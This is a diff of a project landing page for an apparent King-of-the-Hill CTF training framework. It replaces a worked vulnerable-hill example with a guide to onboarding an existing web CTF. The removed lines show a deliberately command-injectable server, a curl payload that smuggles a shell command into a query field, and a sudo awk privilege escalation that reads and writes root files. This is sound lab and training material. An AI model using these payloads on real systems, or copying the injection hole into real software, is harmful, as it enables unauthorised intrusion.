@@ -99,7 +99,7 @@ footer .mono{font-family:var(--mono);letter-spacing:1px}
  <div class="cta">
   <a class="btn" href="https://github.com/JJuly02/king-of-the-hill-ctf">View on GitHub</a>
   <a class="btn ghost" href="#quickstart">Quick start</a>
-  <a class="btn ghost" href="#addhill">Build a hill</a>
+  <a class="btn ghost" href="#addhill">Add a hill</a>
  </div>
  <div class="badges">
   <span class="badge">Pure Python stdlib</span>
@@ -126,11 +126,9 @@ footer .mono{font-family:var(--mono);letter-spacing:1px}
 </section>
 
 <section id="hills">
- <h2>The hills</h2>
+ <h2>The four hills</h2>
  <p class="sub">Each hill is a self-contained vulnerable box: a foothold vulnerability, then a
- local privilege escalation to root. Every one is verified end to end by the smoke test.
- Four ship as the core set; a fifth, HackWars, is the worked example from
- <a href="#addhill">Add your own hill</a>.</p>
+ local privilege escalation to root. Every one is verified end to end by the smoke test.</p>
  <div class="grid g2">
   <div class="card">
    <div class="k">Hill 1 // NetOps Console</div>
@@ -156,12 +154,6 @@ footer .mono{font-family:var(--mono);letter-spacing:1px}
    <p>A CI script console is unlinked from the UI and behind weak HTTP auth. Find it, authenticate, run code.</p>
    <div class="meta"><span class="pill a">foothold: weak creds</span><span class="pill">privesc: sudo tar</span></div>
   </div>
-  <div class="card">
-   <div class="k">Hill 5 // HackWars Arena</div>
-   <h3>Command injection (example)</h3>
-   <p>A match-telemetry console passes a relay host straight into a shell. The worked example built in <a href="#addhill">Add your own hill</a>.</p>
-   <div class="meta"><span class="pill a">foothold: cmd injection</span><span class="pill">privesc: sudo awk</span></div>
-  </div>
  </div>
 </section>
 
@@ -186,77 +178,49 @@ python3 scoreboard.py
 </section>
 
 <section id="addhill">
- <h2>Add your own hill</h2>
- <p class="sub">A hill is a directory under <code>deploy/hills/</code> plus two small config entries. As long
- as it honours the contract below, the agent, scoreboard, tick engine and smoke test pick it up with no
- code changes. The rest of this section builds <b>HackWars Arena</b> (hill-5) end to end as the worked
- example.</p>
+ <h2>Add a hill, or bring in an existing project</h2>
+ <p class="sub">A hill is nothing more than a docker-compose project under <code>deploy/hills/</code> that
+ honours a small contract, plus two config entries. Because it is just a compose project, an existing
+ dockerized target slots in with almost no glue. This section shows both: the contract for a hill from
+ scratch, then onboarding an existing project using the real <b>HackWars</b> web CTF as the example.</p>
 
  <h3>The contract</h3>
  <div class="grid g2">
-  <div class="feat"><span class="dot"></span><div><h4>A foothold to an unprivileged user</h4><p>A vulnerable service running as a normal user (not root). Rooting it from the network lands you as that user, who can read <code>user.txt</code>.</p></div></div>
-  <div class="feat"><span class="dot"></span><div><h4>A planned privesc to root</h4><p>A deliberate local escalation (a sudo GTFOBins rule, a SUID binary, a writable root cron) that leads to <code>root.txt</code>.</p></div></div>
-  <div class="feat"><span class="dot"></span><div><h4>The king.txt convention</h4><p><code>/root/king.txt</code>, owner <code>root:root</code>, mode <code>600</code>, empty at start. Taking the hill means writing your team token there, which needs root.</p></div></div>
-  <div class="feat"><span class="dot"></span><div><h4>A reset that revives the vuln</h4><p><code>reset.sh</code> restores the entry vuln and the privesc path but never touches <code>king.txt</code>, so a box cannot be patched permanently shut.</p></div></div>
+  <div class="feat"><span class="dot"></span><div><h4>A foothold, then a root path</h4><p>The box grants a shell to an unprivileged user (that is <code>user.txt</code>), with a planned local escalation to root (that is <code>root.txt</code>). This is what makes the hold mechanic possible.</p></div></div>
+  <div class="feat"><span class="dot"></span><div><h4>The king.txt convention</h4><p><code>/root/king.txt</code>, owner <code>root:root</code>, mode <code>600</code>, empty at start. Taking the hill is writing your team token there, which needs root. A host-side beacon agent reads it and the tick engine scores you.</p></div></div>
  </div>
+ <p class="sub">Building one from scratch means following any of the four shipped hills: a Dockerfile, an
+ <code>entrypoint.sh</code> that plants the flags and an empty <code>king.txt</code>, a vulnerable
+ <code>server.py</code>, a <code>sudoers.golden</code> privesc, and a <code>reset.sh</code> that revives the
+ vuln without touching <code>king.txt</code>.</p>
 
- <h3>Files</h3>
- <p class="sub">One directory, the same shape as the shipped hills:</p>
-<pre>deploy/hills/hill-5-hackwars/
-  Dockerfile          <span class="c"># base image + the service user (arena)</span>
-  docker-compose.yml  <span class="c"># local demo: publish the service on 8085</span>
-  entrypoint.sh       <span class="c"># plant flags + king.txt, install the privesc, run the service</span>
-  server.py           <span class="c"># the vulnerable service (foothold)</span>
-  sudoers.golden      <span class="c"># the planned privesc rule (restored by reset.sh)</span>
-  reset.sh            <span class="c"># revive vuln + privesc, never touch king.txt</span>
-  README.md           <span class="c"># what it is, the intended path</span></pre>
+ <h3>Bring in an existing project: HackWars</h3>
+ <p class="sub"><a href="https://github.com/JJuly02/CS50-Hackwars">HackWars: The Vulnerabilities Strike
+ Back</a> is a real, already-dockerized Flask web CTF (a Star Wars themed jeopardy game: view-source, XSS,
+ SQL injection, broken access control). It is a good example because you change almost nothing to run it on
+ KOTH.</p>
+ <ol>
+  <li><b>Reuse its container as-is.</b> KOTH hills are compose projects, so you point KOTH at the project's own <code>docker-compose.yml</code> (one Flask service on <code>:8000</code>). No rewrite, no fork.</li>
+  <li><b>Register it.</b> Add one entry to <code>config/hills.json</code> so the scoreboard and SLA prober know it exists, and drop its flags into <code>flags/flags.json</code>. HackWars already ships every flag in <code>flags.txt</code> and <code>ctfd/challenges.yml</code>, so this is a copy.</li>
+  <li><b>Pick how it scores</b> (below).</li>
+  <li><b>Bring it up next to the scoreboard and verify.</b></li>
+ </ol>
+<pre><span class="c"># config/hills.json: one entry points KOTH at the existing service</span>
+{"id":"hackwars","name":"HackWars","service_host":"127.0.0.1","service_port":8000,"hmac_key":"changeme-hackwars","url":"http://localhost:8000"}
 
- <h3>1. The foothold (server.py)</h3>
- <p class="sub">HackWars is a match-telemetry console. Its "replay relay check" passes a host straight into a
- shell, so anything after it runs as <code>arena</code>. That is the entire foothold.</p>
-<pre>match = q.get("match", ["relay-01"])[0]
-out = subprocess.run(f"ping -c 1 -W 1 {match}", shell=True, capture_output=True, text=True)  <span class="c"># command injection</span>
-self._send(200, out.stdout + out.stderr)</pre>
-<pre><span class="c"># foothold + user flag</span>
-curl -sG <span class="a">http://HILL:8085/replay</span> --data-urlencode 'match=x; cat /home/arena/user.txt'</pre>
+<span class="c"># run the existing project unchanged, then the scoreboard alongside it</span>
+cd path/to/CS50-Hackwars/project &amp;&amp; docker compose up -d --build
+cd scoreboard &amp;&amp; KOTH_CONFIG_DIR=../config KOTH_FLAGS=../flags/flags.json python3 scoreboard.py</pre>
 
- <h3>2. The privesc (sudoers.golden)</h3>
- <p class="sub">A single sudo rule lets <code>arena</code> run <code>awk</code> as root with no password. awk can spawn a
- shell, so that is a direct GTFOBins path to root and to <code>root.txt</code>.</p>
-<pre><span class="c"># sudoers.golden</span>
-arena ALL=(root) NOPASSWD: /usr/bin/awk
-
-<span class="c"># from the foothold, escalate and read the root flag</span>
-sudo awk 'BEGIN{system("cat /root/root.txt")}'</pre>
-
- <h3>3. Plant flags and king.txt (entrypoint.sh)</h3>
- <p class="sub">The entrypoint plants both flags, creates an empty root-only <code>king.txt</code>, installs the
- sudo rule from a golden copy, then drops to the service user.</p>
-<pre>echo 'CTF{h4ckw4rs_c0mm4nd_1nj3ct10n_f00th0ld}' &gt; /home/arena/user.txt
-echo 'CTF{h4ckw4rs_sud0_awk_gtf0b1ns_r00t}'     &gt; /root/root.txt
-: &gt; /root/king.txt; chmod 600 /root/king.txt          <span class="c"># root:root, empty = no owner yet</span>
-cp /opt/app/sudoers.golden /etc/sudoers.d/arena       <span class="c"># the planned privesc</span>
-exec su arena -c "python3 /opt/app/server.py"         <span class="c"># service runs unprivileged</span></pre>
-
- <h3>4. Register it (two config entries)</h3>
- <p class="sub">Tell the scoreboard the hill exists, and give it flags. Ids just have to be unique.</p>
-<pre><span class="c"># config/hills.json</span>
-{"id":"hill-5","name":"HackWars Arena","service_host":"127.0.0.1","service_port":8085,"hmac_key":"changeme-hill-5","url":"http://localhost:8085"}
-
-<span class="c"># flags/flags.json</span>
-{"flag_id":"hill-5-user","hill_id":"hill-5","kind":"user","flag":"CTF{h4ckw4rs_c0mm4nd_1nj3ct10n_f00th0ld}"}
-{"flag_id":"hill-5-root","hill_id":"hill-5","kind":"root","flag":"CTF{h4ckw4rs_sud0_awk_gtf0b1ns_r00t}"}</pre>
-
- <h3>5. Take the hill, then verify</h3>
-<pre><span class="c"># take it: write your team token to king.txt (needs root)</span>
-sudo awk 'BEGIN{system("echo TOK-YOURTEAM &gt; /root/king.txt")}'
-
-<span class="c"># bring it up with the others and run the smoke test (chain + reset)</span>
-cd deploy/hills/hill-5-hackwars &amp;&amp; docker compose up -d --build
-bash deploy/smoke-test.sh</pre>
- <div class="note"><p>The service runs as <code>arena</code>, never root, and <code>king.txt</code> is read by the
- beacon agent from <b>outside</b> the box. So a team that fully roots the hill still cannot read the agent
- key or forge an ownership report. That is the whole anti-cheat idea, and every new hill inherits it for free.</p></div>
+ <h3>Two ways an existing project scores</h3>
+ <div class="grid g2">
+  <div class="card"><div class="k">As a hold (attack and defend)</div><p>If the box grants a shell and a root path, add the <code>king.txt</code> convention and point the host-side beacon agent at its container. Teams then take and hold it, and the tick engine scores ownership. Best for targets with RCE and a privesc.</p></div>
+  <div class="card"><div class="k">As flags (jeopardy)</div><p>A web CTF like HackWars is solved for flags, not held, so you score it through the flag service (first blood included) and skip the agent and <code>king.txt</code>. The same flags can also be lifted into a RedutaCTF event through the plugin.</p></div>
+ </div>
+ <div class="note"><p>KOTH's core loop is attack-and-defend, so a pure jeopardy app like HackWars plugs in for
+ its flags, while a box with a root foothold can additionally be held. Either way the point is how little
+ glue an existing, already-dockerized project needs: one <code>hills.json</code> entry, its own compose, and
+ its flags. HackWars has its own page at <a href="https://hackwars.cyberjuly.com/">hackwars.cyberjuly.com</a>.</p></div>
 </section>
 
 <section id="integration">
@@ -287,7 +251,7 @@ bash deploy/smoke-test.sh</pre>
 POST <span class="a">http://core:8080/api/v1/plugin/v1/awards</span>
 Authorization: Bearer plg_...
 {"event_id":"...","team_id":"&lt;current holder&gt;","points":5,
- "ref_id":"tick:2026-09-02T10:00:00Z:hill-5","reason":"KotH tick hill-5"}</pre>
+ "ref_id":"tick:2026-09-02T10:00:00Z:hill-1","reason":"KotH tick hill-1"}</pre>
  <p class="sub">The bridge is configured with environment variables, and the only KOTH-specific part is mapping a
  KOTH team to a RedutaCTF team and reading the current holder from the KOTH scoreboard:</p>
 <pre>KOTH_WEBHOOK_SECRET   <span class="c"># shared secret for verifying core webhooks</span>
